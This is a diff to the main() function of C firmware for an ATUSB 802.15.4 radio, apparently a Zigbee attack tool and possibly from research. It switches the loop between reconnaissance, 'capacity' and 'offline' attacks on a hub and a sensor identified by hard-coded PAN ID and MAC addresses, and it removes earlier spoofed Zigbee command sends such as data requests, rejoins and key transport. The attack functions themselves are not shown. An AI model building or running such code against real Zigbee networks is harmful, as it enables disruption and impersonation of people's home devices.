@@ -10,26 +10,7 @@
  * (at your option) any later version.
  */
 
-#ifndef F_CPU
-#define F_CPU   8000000UL
-#endif
-
-#include <stdint.h>
-
-#include <avr/io.h>
-#include <avr/sleep.h>
-#include <avr/interrupt.h>
-#include <util/delay.h>
-
-#include "usb.h"
-
-#include "board.h"
-#include "sernum.h"
-#include "spi.h"
-#include "atusb/ep0.h"
-
 #include "attack.h"
-
 
 int main(void)
 {
@@ -61,14 +42,11 @@ int main(void)
 	sei();
 	_delay_ms(3000);
 
-	
-
 	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
 	reconnaissance_attack();
 
 	/** TEST FIELD **/
-
-	uint8_t attack_no = 1;
+	uint8_t attack_no = 2;
 	// Here we let dst_device = hub, src_device = sensor to test our API
 	ieee802154_addr hub_addr = {};
 	hub_addr.pan = 0x2ca2;
@@ -76,34 +54,22 @@ int main(void)
 	hub_addr.short_addr = 0x0000;
 	hub_addr.long_addr = 0x286d970002054a14;
 
-	ieee802154_addr sensor_addr = hub_addr;
-	sensor_addr.short_addr = 0x2d38;
-	sensor_addr.long_addr = 0x286d9700010d8ebc;
-
-	// Finally as the user, whenever we send commands, we need to determine whether we will
-	// start RX_AACK mode.
-	rx_aack_config aack_config = {};
-	aack_config.aack_flag = 0;
-	aack_config.dis_ack = 0;
-	aack_config.pending = 0;
-	aack_config.target_short_addr.addr = hub_addr.short_addr;
-	aack_config.target_pan_id.addr = hub_addr.pan;
-
+	ieee802154_addr zed_addr = hub_addr;
+	zed_addr.short_addr = 0x2d38;
+	zed_addr.long_addr = ST_SENSOR_MAC_ADDR;
+	zed_addr.polling_type = 2;
 	/** END OF TEST FIELD **/
 
 	while (1)
 	{
 		if (attack_no == 1)
 		{
-			_delay_ms(2000);
+			capacity_attack(&hub_addr, 0x30000000);
+		}
+		else if (attack_no == 2)
+		{
 			led(1);
-			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, &hub_addr, &sensor_addr, &aack_config);
-			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
-			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0, &sensor_addr, &hub_addr, &aack_config);
-			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, &hub_addr, &sensor_addr, &aack_config);
-			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &sensor_addr, &hub_addr, &aack_config);
-			// send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &sensor_addr, &hub_addr, &aack_config);
-			_delay_ms(2000);
+			offline_attack(&hub_addr, &zed_addr, 0x30000000);
 			led(0);
 		}
 		else
